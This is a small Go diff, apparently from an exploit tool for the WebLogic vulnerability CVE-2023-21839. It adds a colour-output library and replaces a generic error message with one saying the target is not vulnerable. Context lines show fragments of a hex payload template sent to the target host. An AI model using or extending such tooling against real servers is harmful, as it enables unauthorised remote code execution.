@@ -5,6 +5,7 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
+	"github.com/gookit/color"
 	"net"
 	"strconv"
 	"strings"
@@ -67,7 +68,7 @@ func Run(ip string, port1 string, ldap1 string) {
 			"874416e793a312e30000000000004{{key3}}00000001424541" +
 			"2e000000100000000000000000{{key1}}"
 	} else {
-		fmt.Println("[!] error and exit")
+		color.Red.Println("[-] Target weblogic not detected CVE-2023-21839")
 	}
 
 	host := ip
